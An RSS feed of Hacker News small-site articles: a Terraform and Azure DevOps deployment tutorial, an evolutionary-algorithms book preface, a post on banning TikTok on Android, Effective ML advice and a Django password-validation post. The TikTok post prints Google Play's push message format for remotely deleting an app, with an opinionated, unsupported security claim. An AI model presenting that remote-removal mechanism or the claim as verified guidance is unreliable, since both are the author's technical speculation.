<p>A service connection enables you to hook-up the AzureDevOps project to the magical fairy-cloud of Azure. Create it by going to <code>Project settings</code> ‚Üí <code>Service connections</code> and hit new service connection from the top right corner. There you select <code>Azure Resource Manager</code> and then you can use <code>Service principal (automatic)</code> as the authentication method.</p>

<p><img src="https://www.andreasrein.net/images/06-app-service-terraform/azure-devops-service-connection.png"></p>

<p>You then select the scope but remember that if you want Terraform to be able to create resource groups, you should leave the <code>Resource group</code> select as unselected. Pick a short and sweet name, create and you are good to go. I distinguish between the development environment and the production environment in this tutorial and, you should preferably do that too. If you do so, you can use two different subscriptions.</p>

<h3 id="4-install-terraform">4. Install Terraform</h3>

<p>Download Terraform <a href="https://www.terraform.io/downloads.html">here</a>, zip it out and put it somewhere on your disk. Remember to add it to your system‚Äôs <code>PATH</code>.</p>

<h3 id="5-write-infrastructure-code">5. Write infrastructure code</h3>

<p>The fun begins after you have successfully installed Terraform. You can finally start writing deliberate infrastructure code in HcL so warm your fingers up and let‚Äôs start by getting your editor ready. If you are using Visual Studio Code, I highly recommend the excellent plugin <a href="https://marketplace.visualstudio.com/items?itemName=mauve.terraform">Terraform</a>.</p>

<p>So create these files:</p>

<ul>
<li>variables.tf</li>
<li>variables/dev.tfvars</li>
<li>variables/prod.tfvars</li>
<li>main.tf</li>
</ul>

<p><em>Terraform can be highly modular but for the purpose of this guide, I have decided to keep it as simple as possible.</em></p>

<h4 id="variables-tf">variables.tf</h4>

<p><code>variables.tf</code> is the home of all the variables but not the values themselves. The values can be found in the environment specific .tfvars files.</p>

<pre><code># General
variable "resource_group_name" {
  description = "The name of the resource group"
}

variable "location" {
  description = "The Azure region in which all resources should be created"
}

# App Service
variable "app_service_plan_name" {
  description = "The name of the app service plan for the backend"
}

variable "app_service_name" {
  description = "The name of the app service for the backend"
}

# Application Insights
variable "application_insights_name" {
  description = "The name of the application insights resource"
}
</code></pre>

<h4 id="variables-dev-tfvars">variables/dev.tfvars</h4>

<p><code>variables/</code> is the folder with the environment specific variable values. The example uses an homegrown Azure resources naming convention. Go with what you like as long as you keep it consistent.</p>

<pre><code>resource_group_name                       = "rg-terraform-dev"
location                                  = "West Europe"
app_service_plan_name_backend             = "azappp-terraform-dev"
app_service_name_backend                  = "azapp-terraform-dev"
application_insights_name                 = "appi-terraform-dev"
</code></pre>

<h4 id="variables-prod-tfvars">variables/prod.tfvars</h4>

<pre><code>resource_group_name                       = "rg-terraform-prod"
location                                  = "West Europe"
app_service_plan_name_backend             = "azappp-terraform-prod"
app_service_name_backend                  = "azapp-terraform-prod"
application_insights_name                 = "appi-terraform-prod"
</code></pre>

<h4 id="main-tf">main.tf</h4>

<p><code>main.tf</code> is where the infrastructure code resides. The Azure Provider is well documented and it can be found <a href="https://www.terraform.io/docs/providers/azurerm/">here</a>.</p>

<pre><code>/*
* Provider block defines which provider they require
*/

provider "azurerm" {
  version = "=2.26.0"
  features {}
}

terraform {
  backend "azurerm" {}
}

/*
* Resource Group
*/
resource "azurerm_resource_group" "this" {
  name     = var.resource_group_name
  location = var.location
}

/*
* App Service Plan
*/
resource "azurerm_app_service_plan" "this" {
  name                = var.app_service_plan_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  kind                = "Windows"

  sku {
    tier = "Standard"
    size = "S1"
  }
}

/*
* App Service
*/
resource "azurerm_app_service" "this" {
  name                = var.app_service_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  app_service_plan_id = azurerm_app_service_plan.this.id

  site_config {
    websockets_enabled = true
  }

  app_settings = {
    "APPINSIGHTS_INSTRUMENTATIONKEY"      = "${azurerm_application_insights.this.instrumentation_key}"
    "APPINSIGHTS_PORTALINFO"              = "ASP.NET"
    "APPINSIGHTS_PROFILERFEATURE_VERSION" = "1.0.0"
    "WEBSITE_HTTPLOGGING_RETENTION_DAYS"  = "35"
  }
}

/*
* Application Insights
*/
resource "azurerm_application_insights" "this" {
  name                = var.application_insights_name
  location            = azurerm_resource_group.this.location
  resource_group_name = azurerm_resource_group.this.name
  application_type    = "web"
}
</code></pre>

<h3 id="6-create-storage-account-for-state-files">6. Create storage account for state files</h3>

<p>Terraform relies on a state file so it can know what has been done and so forth. The Terraform extension will use a storage account in Azure that we define. So go to your Azure portal and create these resources or use your existing ones.</p>

<ul>
<li>Resource Group: rg-terraform-demo</li>
<li>Storage Account: stterraformdemo</li>
<li>Storage Container: terraform</li>
</ul>

<p>The resource naming is completely optional since they are inside the azure-pipelines.yml file. Remember to double-check the state file resources in <code>azure-pipelines.yml</code>.</p>

<h3 id="7-write-build-pipeline">7. Write build pipeline</h3>

<p>The infrastructure is defined and ready to be deployed on Azure but before we can do that, we would have to define the AzureDevOps build pipeline.</p>

<p>In this example, I will use a deployment template so we can keep it clean in the main azure-pipelines file and reuse it later.</p>

<p>So create these files:</p>

<ul>
<li>azure-pipelines.yml</li>
<li>azure-pipelines-deployment-template.yml</li>
</ul>

<h4 id="azure-pipelines-yml">azure-pipelines.yml</h4>

<p>The two stages, <code>DeployDev</code> and <code>DeployProd</code> is identical apart from the variables passed in the template and that the <code>DeployProd</code> only triggers from the <code>master</code> branch.</p>

<pre><code># Set how the build pipeline triggers
trigger:
  branches:
    include:
      - develop
      - master

# Just say its gonna trigger on pull requests too
pr:
  branches:
    include:
      - develop
      - master

variables:
  # Name of the pipeline. Defaults to the AzureDevOps project name but it can be changed.
  - name: pipelineName
    value: TerraformDemo
  # Name of the resource group where the state file lies
  - name: tfStateRgName
    value: rg-terraform-demo
  # Name of the storage account for the state file
  - name: tfStateStName
    value: stterraformdemo
  # Name of the container for the state file
  - name: tfStateCtrName
    value: terraform

stages:
- stage: DeployDev
  displayName: Deploy Dev
  jobs:
  - template: azure-pipelines-deployment-template.yml
    parameters:
      environment: 'Dev'
      pipelineName: ${{variables.pipelineName}}
      backendServiceName: AzureDev
      tfStateRgName: ${{variables.tfStateRgName}}
      tfStateStName: ${{variables.tfStateStName}}
      tfStateCtrName: ${{variables.tfStateCtrName}}

- stage: DeployProd
  displayName: Deploy Prod
  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/master'))
  jobs:
  - template: azure-pipelines-deployment-template.yml
    parameters:
      environment: 'Prod'
      pipelineName: '${{variables.pipelineName}}'
      backendServiceName: AzureProd
      tfStateRgName: '${{variables.tfStateRgName}}'
      tfStateStName: '${{variables.tfStateStName}}'
      tfStateCtrName: '${{variables.tfStateCtrName}}'
</code></pre>

<h4 id="azure-pipelines-deployment-template-yml">azure-pipelines-deployment-template.yml</h4>

<pre><code>parameters:
- name: 'environment'
  type: 'string'
  displayName: 'The name of the environment'

- name: 'pipelineName'
  type: 'string'
  displayName: 'The name of the pipeline'

- name: 'backendServiceName'
  type: 'string'
  displayName: 'The name of the backend service'

- name: 'tfStateRgName'
  type: 'string'
  displayName: 'The name of the az resource group where the tf state file should be'

- name: 'tfStateStName'
  type: 'string'
  displayName: 'The name of the az storage account where the tf state file should be'

- name: 'tfStateCtrName'
  type: 'string'
  displayName: 'The name of the az storage account container where the tf state should be'

jobs:
  - job: Deploy
    displayName: Deploy ${{parameters.environment}}
    continueOnError: false
    pool:
      name: 'Azure Pipelines'
      vmImage: 'windows-latest'
    steps:
    - task: ‚Ä¶</code></pre></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/">https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/</a></em></p>]]>
            </description>
            <link>https://www.andreasrein.net/posts/app-service-terraform-azure-azuredevops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530366</guid>
            <pubDate>Sat, 19 Sep 2020 21:16:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: My Python Notebook Driven Book on Evolutionary Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530288">thread link</a>) | @DataCrayon
<br/>
September 19, 2020 | https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/ | <a href="https://web.archive.org/web/*/https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

</div>
</div>
</div><div>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>
</div>
</div></div>]]>
            </description>
            <link>https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530288</guid>
            <pubDate>Sat, 19 Sep 2020 21:01:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can TikTok be banned from US based Android devices?]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 31 (<a href="https://news.ycombinator.com/item?id=24530155">thread link</a>) | @bluegopher
<br/>
September 19, 2020 | https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/ | <a href="https://web.archive.org/web/*/https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
      Legal questions aside, let's explore the technical possibilities.
    </p><div>

<p>Let‚Äôs be very clear here. I am not a fan of TikTok. I had the misfortune of coming across it when it was still called Musically and I had to explain to a little girl that she, unlike her friends, was not allowed to dance for strangers. That ruined an otherwise perfect evening.</p>

<p>I‚Äôm also not a fan of Donald Trump(et). It‚Äôs safe to assume that he threatens to shut down TikTok for all the wrong reasons, but if he manages to pull through, it will be a benefit for mankind. So, is it actually technically possible to get TikTok and WeChat banned in the US?</p>

<h2 id="removing-apps-from-google-play">Removing apps from Google Play</h2>

<p>Story time (you can skip ahead two paragraphs for an obvious revelation)!</p>

<p>I once wrote a pretty silly slot machine game for Android. It was as a coding exercise and failed in pretty much every aspect except being recognized for what it actually wasn‚Äôt: a real gambling app.
</p><figure>
  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/pocketbandit.png">
    <img src="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/pocketbandit.png">
  </a>
  
  <figcaption>Pocket Bandit: pretty (, colorful,) boring</figcaption>
  
</figure><p>
                             
                             
All you could do was to bet one to three coins, then pull the lever and watch the reels spin. You started with a fixed amount of credit and the laws of probability dictated that you‚Äôd eventually go bankrupt. Once that happened, you could simply restarted the ‚Äúgame‚Äù and had a full purse again. No <em>wait x hours or pay $$$ to continue playing</em> bullshit. No way of winning anything either. In other words: the most boring one-armed bandit ever. Not even suitable for detoxing a gambling addict. I had somehow managed to put in all the mechanics of a classical slot machine except the one (winning/loosing) that was responsible for producing the excitement.</p>

<p>Well, there‚Äôs no rule that states, you can‚Äôt publish rubbish on Google Play. Much to my surprise though, there is a rule that says, you can‚Äôt publish gambling apps in some Arab countries without governmental approval. So, one fateful morning, I received a mail from Google telling me that my app had been pulled from Play in those countries. I was pissed. Not because the world needed my app. Not because some Arabs were now deprived of the most dull entertainment, only I could provide. I was pissed because someone had obviously only spent the time of looking at the screenshots to determine that this was a gambling app, but hadn‚Äôt bothered to reason how you were suppose to spend (real) money in an app that doesn‚Äôt even request network permission. It felt unjustified. Like a downvote driven in with the banhammer. Someone with the attention span of a puppy had the power of Thor.</p>

<p>There was no point in appealing. After all, the game was crap, but the incident was a nice reminder on how fragile businesses, build on apps are. Somewhere, someone with too little time to be thorough can simply nuke them without prior warning. Needless to say, that in time, the same  kind of sloppiness resulted in more of my apps being pulled ‚Ä¶</p>

<p>So, what‚Äôs the take away from my story?</p>

<p>Geo fencing has always been a core feature of Play and Google never really went out of its way to stand up for developers. Sure, my apps are small fries compared to behemoths like TikTok, but then again, they aren‚Äôt direct competitors to youtube either. Let‚Äôs keep that in mind in case anyone has high hopes for Google putting up a fight.</p>

<h2 id="what-about-sideloading">What about sideloading?</h2>

<p>Who needs Play anyway? Android is not IOS, we can simply download the APK off the web and install it ourselves, right? Eh well, no. It‚Äôs not that simple. Bytedance swallowed Google‚Äôs Cool Aid and switched to App Bundles/Dynamic Delivery in order to reduce the size of their app. So instead of a single, one size fits all APK, you get a bunch of individual files. In case of TikTok v17.6.3 and depending on your device, the list might look like this:</p>

<ul>
<li>com.zhiliaoapp.musically-2021706030.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.en.apk</li>
<li>com.zhiliaoapp.musically-2021706030_config.xhdpi.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_creationtool_so.config.armeabi_v7a.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_fusing.apk</li>
<li>com.zhiliaoapp.musically-2021706030_df_photomovie.apk</li>
</ul>

<p>Split APKs cannot be sideloaded (easily). On plain Android, there‚Äôs simply no user interface for telling the packagemanager that you want it to install an app from several connected files (<a href="https://raccoon.onyxbits.de/blog/merge-split-apk/">after all, making sideloading difficult was/is the whole idea behind App Bundles</a>). You need extra tools (e.g. ADB) for that. But let‚Äôs be brutally honest here, if you are in the target audience of TikTok, then you are probably missing a brain cell or two (out of a total of two) and won‚Äôt be able to use them.</p>

<div>
  
  <p><span>Fun fact</span>
  
  
App Bundles have a build in security flaw. Traditional APKs cannot be modified by the Playstore. App Bundles can. For rogue government agencies, this provides the option of pushing hacked app updates to </p><u>selected</u><p> individuals. For that reason, <b>no</b> app in the "communications" category should ever use App Bundles as a distribution format. Imagine that! Coincidentally, Trump was actually right when calling TikTok a security issue. Cheers ByteDance!

</p></div>
                             
                             

<p>So, why doesn‚Äôt ByteDance simply host a traditional APK on the TikTok website then?</p>

<p>Two reasons actually</p>

<ol>
<li>Self hosting your app means, people will download the self hosted version (duh!), even if they could get it from the Playstore. As a result, the Playstore version sees less downloads, less reviews and less ratings which may eventually lead to it spiraling down in the rankings (ever wondered why all youtubers end their videos with the magic mantra ‚Äúlike and subscribe, hit the bell and give me a thumbs up‚Äù? Same mechanic there). This, by the way was the leverage, Google used to monopolize the app store market on Android: you are free to host elsewhere, but if your competitors solely host with us, they will eventually outrank you.</li>
<li>ByteDance not only drank the Google Cool aid, but also coughed it up and swallowed it again. Part of their revenue is in-app purchases. Those don‚Äôt work with sideloaded APKs. They could, of course, implement their own <abbr title="In App Purchase">IAP</abbr>, but that‚Äôs something <a href="https://raccoon.onyxbits.de/blog/2020081401/">Epic tried with Fortnite</a> recently‚Ä¶</li>
</ol>

<h2 id="removing-existing-tiktok-installations-from-devices">Removing existing TikTok installations from devices</h2>

<p>Buckle up, this may come as a surprise or as a confirmation of your fears!</p>

<p>Did you ever notice the big green ‚Äúinstall‚Äù button on the Google Play website? With it, you can conveniently browse the store on your PC and send apps to your phone for installation.</p>

<figure>
  <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
    <img src="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/googleplay-tiktok.png">
  </a>
  
  <figcaption>Screencap: The install button on the Play website is sort off a remnant from the old days when 320x480 screens where the norm and you'd rather browse the androidmarket (as it was called back then) on your PC.</figcaption>
  
</figure>
                             
                             

<p>This is done via ‚ÄúPush messages‚Äù. Which is just a modern way of saying that your phone wakes up every couple of minutes in order to waste battery and bandwidth on checking if there are any new ads you should see. It also checks if there are any app updates or pending installs (from the green button) while it is at it, just so you have a reason not to disable the <del>spy</del> playstore app when you don‚Äôt need it. The relevant <a href="https://developers.google.com/protocol-buffers/">message structure</a> looks like this:</p>

<div><pre><code data-lang="protobuf"><span>message</span> <span>Notification</span> {<span>
</span><span></span>  <span>optional</span> <span>int32</span> notificationType <span>=</span> <span>1</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> timestamp <span>=</span> <span>3</span>;<span>
</span><span></span>  <span>optional</span> Docid docid <span>=</span> <span>4</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> docTitle <span>=</span> <span>5</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> userEmail <span>=</span> <span>6</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppNotificationData appData <span>=</span> <span>7</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppDeliveryData appDeliveryData <span>=</span> <span>8</span>;<span>
</span><span></span>  <span>optional</span> PurchaseRemovalData purchaseRemovalData <span>=</span> <span>9</span>;<span>
</span><span></span>  <span>optional</span> UserNotificationData userNotificationData <span>=</span> <span>10</span>;<span>
</span><span></span>  <span>//optional InAppNotificationData inAppNotificationData = 11;
</span><span></span>  <span>//optional PurchaseDeclinedData purchaseDeclinedData = 12;
</span><span></span>  <span>optional</span> <span>string</span> notificationId <span>=</span> <span>13</span>;<span>
</span><span></span>  <span>optional</span> LibraryUpdate libraryUpdate <span>=</span> <span>14</span>;<span>
</span><span></span>  <span>optional</span> LibraryDirtyData libraryDirtyData <span>=</span> <span>15</span>;<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>message</span> <span>AndroidAppDeliveryData</span> {<span>
</span><span></span>  <span>optional</span> <span>int64</span> downloadSize <span>=</span> <span>1</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> signature <span>=</span> <span>2</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> downloadUrl <span>=</span> <span>3</span>;<span>
</span><span></span>  <span>repeated</span> AppFileMetadata additionalFile <span>=</span> <span>4</span>;<span>
</span><span></span>  <span>repeated</span> HttpCookie downloadAuthCookie <span>=</span> <span>5</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> forwardLocked <span>=</span> <span>6</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> refundTimeout <span>=</span> <span>7</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> serverInitiated <span>=</span> <span>8</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> postInstallRefundWindowMillis <span>=</span> <span>9</span>;<span>
</span><span></span>  <span>optional</span> <span>bool</span> immediateStartNeeded <span>=</span> <span>10</span>;<span>
</span><span></span>  <span>optional</span> AndroidAppPatchData patchData <span>=</span> <span>11</span>;<span>
</span><span></span>  <span>optional</span> EncryptionParams encryptionParams <span>=</span> <span>12</span>;<span>
</span><span></span>  <span>optional</span> <span>string</span> gzippedDownloadUrl <span>=</span> <span>13</span>;<span>
</span><span></span>  <span>optional</span> <span>int64</span> gzippedDownloadSize <span>=</span> <span>14</span>;<span>
</span><span></span>  <span>repeated</span> SplitDeliveryData splitDeliveryData <span>=</span> <span>15</span>;<span>
</span><span></span>  <span>optional</span> <span>int32</span> installLocation <span>=</span> <span>16</span>;<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>message</span> <span>PurchaseRemovalData</span> {<span>
</span><span></span>  <span>optional</span> <span>bool</span> malicious <span>=</span> <span>1</span>;<span>
</span><span></span>}</code></pre></div>

<p>A request to delete an app from a device looks like this:</p>

<div><pre><code data-lang="protobuf">notificationType<span>:</span> <span>2</span><span>
</span><span></span>docid {<span>
</span><span></span>  backendDocId<span>:</span> <span>"com.zhiliaoapp.musically"</span><span>
</span><span></span>}<span>
</span><span></span>purchaseRemovalData {<span>
</span><span></span>  malicious<span>:</span> <span>true</span><span>
</span><span></span>}</code></pre></div>

<p>Note that the malicious flag is purely cosmetic. The only thing Play has to send is the package name of the app and the notificationType 2. The app gets deleted, even if it wasn‚Äôt installed via Play.</p>

<h2 id="blocking-tiktok-in-the-usa">Blocking TikTok in the USA</h2>

<p>Let‚Äôs say you are an existing TikTok user and a US citizen. Let‚Äôs say, after reading the above, you disable the Playstore client, so Google can‚Äôt delete apps from your phone. What are they going to do then? Tell your ISP to firewall the TikTok servers (I heard, China has the tech for that. Maybe they‚Äôll share‚Ä¶)? Well, curiously, there‚Äôs a much simpler solution. Did I already mention that ByteDance drank the Google Coolaid to the last drip? Let‚Äôs use an <a href="https://raccoon.onyxbits.de/">apk downloader</a> to request the <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/com_zhiliaoapp_musically.json">Google Playstore entry for the TikTok app</a>. Here‚Äôs an excerpt:</p>

<div><pre><code data-lang="json"><span>"dependency"</span><span>:</span> [{
          <span>"packageName"</span>: <span>"com.google.android.gms"</span>,
          <span>"minVersionCode"</span>: <span>12451000</span>,
          <span>"skipPermissions"</span>: <span>true</span>,
          <span>"deferredInstallAllowed"</span>: <span>false</span>
        }]</code></pre></div>

<p>The <code>com.google.android.gms</code>package is ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/">https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/</a></em></p>]]>
            </description>
            <link>https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530155</guid>
            <pubDate>Sat, 19 Sep 2020 20:35:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effective ML (and F#)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529774">thread link</a>) | @jasim
<br/>
September 19, 2020 | http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp | <a href="https://web.archive.org/web/*/http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
  <p>
    This is a summary of <a href="http://twitter.com/#!/yminsky">Yaron Minsky</a>'s nine pieces of advice from the <a href="http://vimeo.com/14313378">Effective ML</a> video. Since ML is a predecessor of F#, most of the advice applies to F# as well.
  </p>
  <p>
    <strong>1. Favor readers over writers (10:20)</strong>. There're systematic differences in opinion between those who spent their time reading code and those who spent it writing code. Whenever there's a difference in opinion between these two groups, the readers are always right and the writers are always wrong. The readers will always push in the direction of clarity and simplicity and the ability to change behavior easily. At least if you're building software that's going to last.
  </p>
  <p>
    <strong>2. Create uniform interfaces (12:15)</strong>. Always create an interface to your code to make it easier on the reader. When you build interfaces, you should have standards that apply uniformly across your code base to build solid expectations. Those who use your code should know what to provide and what to expect when interfacing with your codebase.
  </p>
  <p>
    <strong>3. Make illegal states unrepresentable (18:03)</strong>. Use the type system as a tool to enforce invariants on the code you write. Choose your data types such that states that are illegal don't show up as legal states in the program. Take this code representing various connection information as an example. It keeps track of relevant information in a fairly readable manner:
  </p>
  <pre>type connection_state =
  | Connecting
  | Connected
  | Disconnected

type connection_info = {
    state:             connection_state
    server:            IPAddress
    last_ping_time:    DateTime option
    last_ping_id:      int option
    session_id:        string option
    when_initiated:    DateTime option
    when_disconnected: DateTime option
}</pre>
  <p>On the surface these types look reasonable, but there're some tricky invariants that need to hold about the data. For instance, if you have a last_ping_time, you should probably also have a last_ping_id and vice versa. And the session_id and when_initiated probably only makes sense when you're connected. Similarly, when_disconnected only makes sense if you've been disconnected.</p>
  <p>The key is that there's nothing about the types that help you enforce all these invariants. A better approach would be to refactor the connection_info into a series of types where the invariants would be inherent in the types themselves rather than being implicit in the logic surrounding the types:</p>
  <pre>type connecting = { when_initiated: DateTime }
type connected = { last_ping: (DateTime * int) option
                   session_id: string }
type disconnected = { when_connected: DateTime }

type connection_state =
  | Connecting of connecting
  | Connected of connected
  | Disconnected of disconnected

type connection_info = {
    state: connection_state
    server: IPAddress
}</pre>
  <p>server remains in connection_info because it applies to any of the states. The other information have been grouped together with the state it related to. The different connection_states are no longer merely a simple enumerated type but each of the different tags have content. Note also how the last_ping is now both the last_ping_time and last_ping_id. Either both are present, and grouped together, or not.</p>
  <p>
    <strong>4. Code for exhaustiveness (28:33)</strong>. This one is closely related to making illegal states unrepresentable in that you should write your code aiming at exhaustiveness guarantees. For instance, when you have a match statement, the compiler will warn you if the match isn't exhaustive. The key benefit is as a refactoring tool because it guides changes in the code base. Don't use the match all because it means that if you expand on the discriminated union the compiler will not warn you.
  </p>
  <p>
    <strong>5. Open few modules (34:08)</strong>. When you open a module, it makes your code a bit shorter, and that's great for the guy who wrote the code, but not the guy reading it. Now you can no longer just look at the code and tell where the value came from. In F#, with Visual Studio integration and IntelliSense, this is less of a problem. But the key advice is to respect the cognitive limitation of the people reading the code. If you want people to remember something, make them remember only for a short period of time.
  </p>
  <p>
    <strong>6. Make common errors obvious (38:10)</strong>. Use exceptions for exceptional conditions is what people often tell you. But whether something is a common case depends on context. For instance, in one context it's an error if an element isn't in a list, whereas in others it's perfectly acceptable. For your API it may depend on the caller if a case is exceptional or not. To better support the caller, you could create two versions depending on how you want to communicate an error:
  </p>
  <pre>val hd : 'T list -&gt; 'T option
val hd_exn : 'T list -&gt; 'T</pre>
  <p>Now you can tell from the name of the function weather it throws an exception or not. For people reading the code it makes it easier to understand the error behavior of the code.</p>
  <p>
    <strong>7. Avoid boilerplate (40:52)</strong>. Avoid repeating the same code, or almost the same code, in multiple places. Boilerplate appears, in general, because people have a cut and paste template they use to do almost the same thing in multiple spots and because their language isn't good enough to encode what they want to do in a clean way. You want to get rid of boilerplate because the structure you're repeating is there for a reason, and your code evolves. At that point you're not going to remember all the places where the repetition shows up. It also goes back to readability. It's hard to convince people to read code if it's dull. And nothing is duller than boilerplate, even though the code is critical.
  </p>
  <p>Interestingly, reducing boilerplate doesn't always make code less verbose. The goal isn't to make the code shorter but to separate out which parts of the code is the same and which parts vary.</p>
  <p>
    <strong>8. Avoid complex type hackery (45:30)</strong>. The enemy of good code, of correctness, isn't dynamic guarantees, properties about the code that cannot be proved at compile time, but complexity. Refrain from making your code more complex (using <a href="http://mlton.org/PhantomType">phantom types</a>, for instance), just so you can have the type system verify additional properties of the code.
  </p>
  <p>
    <strong>9. Don't be puritanical about purity (47:10)</strong>. Avoiding side-effect is generally worth striving for, because code without side-effects tends to be easier to reason about. But sometimes it's also just easier to code with side-effects. There may even be performance reasons for allowing side-effects so don't be embarrassed about it. In reality, programs don't just compute things, they do things like write files, send messages, and so on. All this doing involves side-effects. Again, remember that the enemy of correctness is complexity. Don't jump through hoops to make your code too complex just to make it pure.
  </p>
</div></div>]]>
            </description>
            <link>http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529774</guid>
            <pubDate>Sat, 19 Sep 2020 19:17:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How does Django validate passwords?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529740">thread link</a>) | @rangerranvir
<br/>
September 19, 2020 | https://ranvir.xyz/blog/how-does-django-validate-passwords/ | <a href="https://web.archive.org/web/*/https://ranvir.xyz/blog/how-does-django-validate-passwords/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><img data-src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png" alt="How does Django validate passwords" title="How does Django validate passwords" src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png">
</p><p>
A few days ago, I was working on one of my old Django projects. It was running an old version of Django and I wanted to keep it updated with the latest changes of the framework.</p>
<p>
So to check the <a href="https://ranvir.xyz/blog/django-admin-tips-and-tricks/">admin site</a>, I tried to create the superuser after connection to the local database.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span>
</code></pre></div></div>

<p>
When I passed a password similar to the username it failed saying, <code>The password is too similar to the username.</code></p>
<p><img data-src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png" alt="The password is too similar to the username" title="The password is too similar to the username" src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png">
</p><p>
This error triggered me to check the working behind this password validation feature.</p><p>
The first thing that I looked into was the <code>manage.py</code> file itself which in turn was importing and executing a method called, <code>execute_from_command_line</code>.</p><p>
I traced it back and found a package <code>commands</code> containing everything that I wanted to know. This directory had two files.</p>
